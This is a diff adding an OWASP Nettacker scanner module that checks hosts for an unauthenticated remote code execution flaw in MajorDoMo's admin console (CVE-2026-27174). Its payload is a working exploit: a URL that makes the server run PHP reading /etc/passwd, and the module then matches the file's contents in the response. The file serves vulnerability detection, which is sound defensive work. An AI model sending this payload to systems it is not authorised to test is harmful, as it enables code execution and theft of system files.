@@ -1,0 +1,60 @@
+info:
+  name: majordomo_rce_cve_2026_27174_vuln
+  author: OWASP Nettacker Team
+  severity: 9.8
+  description: |
+    Unauthenticated Remote Code Execution vulnerability in MajorDoMo's admin
+    panel PHP console caused by an include order bug and missing exit after
+    redirect. An unauthenticated attacker can execute arbitrary PHP code via
+    a crafted GET request to admin.php's console endpoint.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-27174
+    - https://github.com/sergejey/majordomo/issues/1177
+    - https://chocapikk.com/posts/2026/majordomo-revisited
+    - https://www.vulncheck.com/advisories/majordomo-unauthenticated-remote-code-execution-via-admin-console-eval
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve2026
+    - cve
+    - majordomo
+    - rce
+    - unauthenticated
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 8080
+              paths:
+                - admin.php?ajax_panel=1&op=console&command=echo+file_get_contents%28%27%2Fetc%2Fpasswd%27%29%3B
+
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: '200'
+              reverse: false
+
+            content:
+              regex: 'root:[x*]:0:0:'
+              reverse: false
